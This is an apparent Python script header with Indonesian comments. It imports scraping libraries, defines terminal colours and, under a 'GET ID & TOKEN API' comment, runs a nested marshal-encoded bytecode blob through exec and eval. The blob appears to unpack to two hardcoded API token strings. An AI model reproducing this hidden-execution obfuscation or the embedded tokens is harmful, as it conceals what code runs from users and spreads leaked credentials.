# MODUL IN PYTHON 
# rikod mulu si plerr
import os,sys,requests, re, bs4, json, time,random, datetime, rich
import hmac, hashlib, urllib, urllib.request, uuid
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime
from random import randint

# MODUL IN RICH
from rich import print as tulis
from rich.panel import Panel

#--- GET ID & TOKEN API
exec(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 39, 109, 97, 114, 115, 104, 97, 108, 39, 41, 46, 108, 111, 97, 100, 115],chr))(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x00\x00\x00\x00\xf3\\\x00\x00\x00\x97\x00\x02\x00e\x00\x02\x00\x02\x00e\x01\x02\x00d\x00\x84\x00d\x01g\x00d\x02\xa2\x01e\x02\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x04S\x00)\x05c\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00\xf3F\x00\x00\x00\x87\x02\x97\x00|\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x88\x02f\x01d\x01\x84\x08|\x01D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00)\x02Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3&\x00\x00\x00\x95\x01\x97\x00g\x00|\x00]\r}\x01\x02\x00\x89\x02|\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x91\x02\x8c\x0eS\x00\xa9\x00r\x04\x00\x00\x00)\x03\xda\x02.0\xda\x03___\xda\x01_s\x03\x00\x00\x00  \x80\xfa/\x1b[1;91m<\x1b[1;95m[\x1b[1;96mromz\x1b[1;95m]\x1b[1;91m>\x1b[0m\xfa\n<listcomp>z\x1c<lambda>.<locals>.<listcomp>\x02\x00\x00\x00s!\x00\x00\x00\xf8\x80\x00\xd0(>\xd0(>\xd0(>\xb0C\xa8\x11\xa8\x11\xa83\xa9\x16\xac\x16\xd0(>\xd0(>\xd0(>\xf3\x00\x00\x00\x00)\x01\xda\x04join)\x03\xda\x04____\xda\x02__r\x07\x00\x00\x00s\x03\x00\x00\x00  `r\x08\x00\x00\x00\xfa\x08<lambda>r\x0e\x00\x00\x00\x02\x00\x00\x00s(\x00\x00\x00\xf8\x80\x00\x98d\x9fi\x9ai\xd0(>\xd0(>\xd0(>\xd0(>\xb82\xd0(>\xd1(>\xd4(>\xd1\x1e?\xd4\x1e?\x80\x00r\n\x00\x00\x00\xda\x00)\x1b\xe9_\x00\x00\x00r\x10\x00\x00\x00\xe9i\x00\x00\x00\xe9m\x00\x00\x00\xe9p\x00\x00\x00\xe9o\x00\x00\x00\xe9r\x00\x00\x00\xe9t\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00\xe9(\x00\x00\x00\xe9'\x00\x00\x00r\x12\x00\x00\x00\xe9a\x00\x00\x00r\x15\x00\x00\x00\xe9s\x00\x00\x00\xe9h\x00\x00\x00r\x19\x00\x00\x00\xe9l\x00\x00\x00r\x18\x00\x00\x00\xe9)\x00\x00\x00\xe9.\x00\x00\x00r\x1c\x00\x00\x00r\x14\x00\x00\x00r\x19\x00\x00\x00\xe9d\x00\x00\x00r\x1a\x00\x00\x00s\x8b\x0b\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x00\x00\x00\x00\xf3\\\x00\x00\x00\x97\x00\x02\x00e\x00\x02\x00\x02\x00e\x01\x02\x00d\x00\x84\x00d\x01g\x00d\x02\xa2\x01e\x02\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x04S\x00)\x05c\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00\xf3F\x00\x00\x00\x87\x02\x97\x00|\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x88\x02f\x01d\x01\x84\x08|\x01D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00)\x02Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3&\x00\x00\x00\x95\x01\x97\x00g\x00|\x00]\r}\x01\x02\x00\x89\x02|\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x91\x02\x8c\x0eS\x00\xa9\x00r\x04\x00\x00\x00)\x03\xda\x02.0\xda\x03___\xda\x01_s\x03\x00\x00\x00  \x80\xfa/\x1b[1;91m<\x1b[1;95m[\x1b[1;96mromz\x1b[1;95m]\x1b[1;91m>\x1b[0m\xfa\n<listcomp>z\x1c<lambda>.<locals>.<listcomp>\x02\x00\x00\x00s!\x00\x00\x00\xf8\x80\x00\xd0(>\xd0(>\xd0(>\xb0C\xa8\x11\xa8\x11\xa83\xa9\x16\xac\x16\xd0(>\xd0(>\xd0(>\xf3\x00\x00\x00\x00)\x01\xda\x04join)\x03\xda\x04____\xda\x02__r\x07\x00\x00\x00s\x03\x00\x00\x00  `r\x08\x00\x00\x00\xfa\x08<lambda>r\x0e\x00\x00\x00\x02\x00\x00\x00s(\x00\x00\x00\xf8\x80\x00\x98d\x9fi\x9ai\xd0(>\xd0(>\xd0(>\xd0(>\xb82\xd0(>\xd1(>\xd4(>\xd1\x1e?\xd4\x1e?\x80\x00r\n\x00\x00\x00\xda\x00)\x1b\xe9_\x00\x00\x00r\x10\x00\x00\x00\xe9i\x00\x00\x00\xe9m\x00\x00\x00\xe9p\x00\x00\x00\xe9o\x00\x00\x00\xe9r\x00\x00\x00\xe9t\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00\xe9(\x00\x00\x00\xe9'\x00\x00\x00r\x12\x00\x00\x00\xe9a\x00\x00\x00r\x15\x00\x00\x00\xe9s\x00\x00\x00\xe9h\x00\x00\x00r\x19\x00\x00\x00\xe9l\x00\x00\x00r\x18\x00\x00\x00\xe9)\x00\x00\x00\xe9.\x00\x00\x00r\x1c\x00\x00\x00r\x14\x00\x00\x00r\x19\x00\x00\x00\xe9d\x00\x00\x00r\x1a\x00\x00\x00s\x02\x08\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x00\x00\x00\x00\xf3\\\x00\x00\x00\x97\x00\x02\x00e\x00\x02\x00\x02\x00e\x01\x02\x00d\x00\x84\x00d\x01g\x00d\x02\xa2\x01e\x02\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x04S\x00)\x05c\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00\xf3F\x00\x00\x00\x87\x02\x97\x00|\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x88\x02f\x01d\x01\x84\x08|\x01D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00)\x02Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3&\x00\x00\x00\x95\x01\x97\x00g\x00|\x00]\r}\x01\x02\x00\x89\x02|\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x91\x02\x8c\x0eS\x00\xa9\x00r\x04\x00\x00\x00)\x03\xda\x02.0\xda\x03___\xda\x01_s\x03\x00\x00\x00  \x80\xfa/\x1b[1;91m<\x1b[1;95m[\x1b[1;96mromz\x1b[1;95m]\x1b[1;91m>\x1b[0m\xfa\n<listcomp>z\x1c<lambda>.<locals>.<listcomp>\x02\x00\x00\x00s!\x00\x00\x00\xf8\x80\x00\xd0(>\xd0(>\xd0(>\xb0C\xa8\x11\xa8\x11\xa83\xa9\x16\xac\x16\xd0(>\xd0(>\xd0(>\xf3\x00\x00\x00\x00)\x01\xda\x04join)\x03\xda\x04____\xda\x02__r\x07\x00\x00\x00s\x03\x00\x00\x00  `r\x08\x00\x00\x00\xfa\x08<lambda>r\x0e\x00\x00\x00\x02\x00\x00\x00s(\x00\x00\x00\xf8\x80\x00\x98d\x9fi\x9ai\xd0(>\xd0(>\xd0(>\xd0(>\xb82\xd0(>\xd1(>\xd4(>\xd1\x1e?\xd4\x1e?\x80\x00r\n\x00\x00\x00\xda\x00)\x1b\xe9_\x00\x00\x00r\x10\x00\x00\x00\xe9i\x00\x00\x00\xe9m\x00\x00\x00\xe9p\x00\x00\x00\xe9o\x00\x00\x00\xe9r\x00\x00\x00\xe9t\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00\xe9(\x00\x00\x00\xe9'\x00\x00\x00r\x12\x00\x00\x00\xe9a\x00\x00\x00r\x15\x00\x00\x00\xe9s\x00\x00\x00\xe9h\x00\x00\x00r\x19\x00\x00\x00\xe9l\x00\x00\x00r\x18\x00\x00\x00\xe9)\x00\x00\x00\xe9.\x00\x00\x00r\x1c\x00\x00\x00r\x14\x00\x00\x00r\x19\x00\x00\x00\xe9d\x00\x00\x00r\x1a\x00\x00\x00s\x81\x04\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x00\x00\x00\x00\xf3\\\x00\x00\x00\x97\x00\x02\x00e\x00\x02\x00\x02\x00e\x01\x02\x00d\x00\x84\x00d\x01g\x00d\x02\xa2\x01e\x02\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x04S\x00)\x05c\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00\xf3F\x00\x00\x00\x87\x02\x97\x00|\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x88\x02f\x01d\x01\x84\x08|\x01D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00)\x02Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3&\x00\x00\x00\x95\x01\x97\x00g\x00|\x00]\r}\x01\x02\x00\x89\x02|\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x91\x02\x8c\x0eS\x00\xa9\x00r\x04\x00\x00\x00)\x03\xda\x02.0\xda\x03___\xda\x01_s\x03\x00\x00\x00  \x80\xfa/\x1b[1;91m<\x1b[1;95m[\x1b[1;96mromz\x1b[1;95m]\x1b[1;91m>\x1b[0m\xfa\n<listcomp>z\x1c<lambda>.<locals>.<listcomp>\x02\x00\x00\x00s!\x00\x00\x00\xf8\x80\x00\xd0(>\xd0(>\xd0(>\xb0C\xa8\x11\xa8\x11\xa83\xa9\x16\xac\x16\xd0(>\xd0(>\xd0(>\xf3\x00\x00\x00\x00)\x01\xda\x04join)\x03\xda\x04____\xda\x02__r\x07\x00\x00\x00s\x03\x00\x00\x00  `r\x08\x00\x00\x00\xfa\x08<lambda>r\x0e\x00\x00\x00\x02\x00\x00\x00s(\x00\x00\x00\xf8\x80\x00\x98d\x9fi\x9ai\xd0(>\xd0(>\xd0(>\xd0(>\xb82\xd0(>\xd1(>\xd4(>\xd1\x1e?\xd4\x1e?\x80\x00r\n\x00\x00\x00\xda\x00)\x1b\xe9_\x00\x00\x00r\x10\x00\x00\x00\xe9i\x00\x00\x00\xe9m\x00\x00\x00\xe9p\x00\x00\x00\xe9o\x00\x00\x00\xe9r\x00\x00\x00\xe9t\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00\xe9(\x00\x00\x00\xe9'\x00\x00\x00r\x12\x00\x00\x00\xe9a\x00\x00\x00r\x15\x00\x00\x00\xe9s\x00\x00\x00\xe9h\x00\x00\x00r\x19\x00\x00\x00\xe9l\x00\x00\x00r\x18\x00\x00\x00\xe9)\x00\x00\x00\xe9.\x00\x00\x00r\x1c\x00\x00\x00r\x14\x00\x00\x00r\x19\x00\x00\x00\xe9d\x00\x00\x00r\x1a\x00\x00\x00s\x00\x01\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xf3\x0e\x00\x00\x00\x97\x00d\x00Z\x00d\x01Z\x01d\x02S\x00)\x03z#AAEpIEq3gxzNui5z962GqWj-Zii1gmRkHasz#AAFyLdcYxMKj2yVWBWEzCCeOrXbH-kGs2MEN)\x02\xda\x0egett_token_API\xda\x0fgett_token_API2\xa9\x00\xf3\x00\x00\x00\x00\xfa/\x1b[1;91m<\x1b[1;95m[\x1b[1;96mromz\x1b[1;95m]\x1b[1;91m>\x1b[0m\xfa\x08<module>r\x07\x00\x00\x00\x01\x00\x00\x00s\x13\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x116\x80\x0e\xd8\x127\x80\x0f\x80\x0f\x80\x0fr\x05\x00\x00\x00N)\x03\xda\x04exec\xda\x04eval\xda\x03chrr\x04\x00\x00\x00r\n\x00\x00\x00r\x08\x00\x00\x00\xfa\x08<module>r#\x00\x00\x00\x01\x00\x00\x00s\x84\x00\x00\x00\xf0\x03\x01\x01\x01\xe0\x00\x04\x80\x04\xf0\x00\x00\x06F\x03\x80T\x80T\xd0\x0b?\xd0\x0b?\xd0\x0b?\xc0\x12\xf0\x00\x00E\x01@\x03\xf0\x00\x00E\x01@\x03\xf0\x00\x00E\x01@\x03\xf0\x00\x00A\x03D\x03\xf1\x00\x00\x0bE\x03\xf4\x00\x00\x0bE\x03\xf1\x00\x00\x06F\x03\xf4\x00\x00\x06F\x03\xf0\x00\x00G\x03U\x0b\xf1\x00\x00\x06V\x0b\xf4\x00\x00\x06V\x0b\xf1\x00\x00\x01W\x0b\xf4\x00\x00\x01W\x0b\xf0\x00\x00\x01W\x0b\xf0\x00\x00\x01W\x0b\xf0\x00\x00\x01W\x0br\n\x00\x00\x00N)\x03\xda\x04exec\xda\x04eval\xda\x03chrr\x04\x00\x00\x00r\n\x00\x00\x00r\x08\x00\x00\x00\xfa\x08<module>r#\x00\x00\x00\x01\x00\x00\x00s\x84\x00\x00\x00\xf0\x03\x01\x01\x01\xe0\x00\x04\x80\x04\xf0\x00\x00\x06F\x03\x80T\x80T\xd0\x0b?\xd0\x0b?\xd0\x0b?\xc0\x12\xf0\x00\x00E\x01@\x03\xf0\x00\x00E\x01@\x03\xf0\x00\x00E\x01@\x03\xf0\x00\x00A\x03D\x03\xf1\x00\x00\x0bE\x03\xf4\x00\x00\x0bE\x03\xf1\x00\x00\x06F\x03\xf4\x00\x00\x06F\x03\xf0\x00\x00G\x03^6\xf1\x00\x00\x06_6\xf4\x00\x00\x06_6\xf1\x00\x00\x01`6\xf4\x00\x00\x01`6\xf0\x00\x00\x01`6\xf0\x00\x00\x01`6\xf0\x00\x00\x01`6r\n\x00\x00\x00N)\x03\xda\x04exec\xda\x04eval\xda\x03chrr\x04\x00\x00\x00r\n\x00\x00\x00r\x08\x00\x00\x00\xfa\x08<module>r#\x00\x00\x00\x01\x00\x00\x00s\x8c\x00\x00\x00\xf0\x03\x01\x01\x01\xe0\x00\x04\x80\x04\xf0\x00\x00\x06F\x03\x80T\x80T\xd0\x0b?\xd0\x0b?\xd0\x0b?\xc0\x12\xf0\x00\x00E\x01@\x03\xf0\x00\x00E\x01@\x03\xf0\x00\x00E\x01@\x03\xf0\x00\x00A\x03D\x03\xf1\x00\x00\x0bE\x03\xf4\x00\x00\x0bE\x03\xf1\x00\x00\x06F\x03\xf4\x00\x00\x06F\x03\xf0\x00\x00G\x03Oa\x01\xf1\x00\x00\x06Pa\x01\xf4\x00\x00\x06Pa\x01\xf1\x00\x00\x01Qa\x01\xf4\x00\x00\x01Qa\x01\xf0\x00\x00\x01Qa\x01\xf0\x00\x00\x01Qa\x01\xf0\x00\x00\x01Qa\x01r\n\x00\x00\x00N)\x03\xda\x04exec\xda\x04eval\xda\x03chrr\x04\x00\x00\x00r\n\x00\x00\x00r\x08\x00\x00\x00\xfa\x08<module>r#\x00\x00\x00\x01\x00\x00\x00s\x8c\x00\x00\x00\xf0\x03\x01\x01\x01\xe0\x00\x04\x80\x04\xf0\x00\x00\x06F\x03\x80T\x80T\xd0\x0b?\xd0\x0b?\xd0\x0b?\xc0\x12\xf0\x00\x00E\x01@\x03\xf0\x00\x00E\x01@\x03\xf0\x00\x00E\x01@\x03\xf0\x00\x00A\x03D\x03\xf1\x00\x00\x0bE\x03\xf4\x00\x00\x0bE\x03\xf1\x00\x00\x06F\x03\xf4\x00\x00\x06F\x03\xf0\x00\x00G\x03`L\x02\xf1\x00\x00\x06aL\x02\xf4\x00\x00\x06aL\x02\xf1\x00\x00\x01bL\x02\xf4\x00\x00\x01bL\x02\xf0\x00\x00\x01bL\x02\xf0\x00\x00\x01bL\x02\xf0\x00\x00\x01bL\x02r\n\x00\x00\x00"))

#--- WARNA RICH
Te = '[b]' # tebal 
P = '[#FFFFFF]' # putih
U = '[#AF00FF]' # ungu
O = '[#00FFFF]' # biru muda
M = '[#FF0022]' # merah
Pi = '[#FF0099]' # pink
H = '[#00FF33]' # hijau
K = '[#FFFF00]' # kuning
J = "[#FF8F00]" # Jingga

#--- WARNA ANSII (PYTHON)
m = '\x1b[1;91m' # merah
h = '\x1b[1;92m' # hijau
k = '\x1b[1;93m' # kuning
b = '\x1b[1;94m' # biru
u = '\x1b[1;95m' # ungu
o = '\x1b[1;96m' # biru muda
p = '\x1b[1;97m' # putih
j = '\033[38;2;255;127;0;1m' # orange
n = '\x1b[0m' # clear
til = '•'
ansixx = random.choice([m, h, k, b, u, o, p, j])

"""

       fiks sekali di ubah error                                                                                                                                                                                                                                                                                                                                                                                                                                                               CODING BY GUWEH ROMI AFRIZAL :v

"""
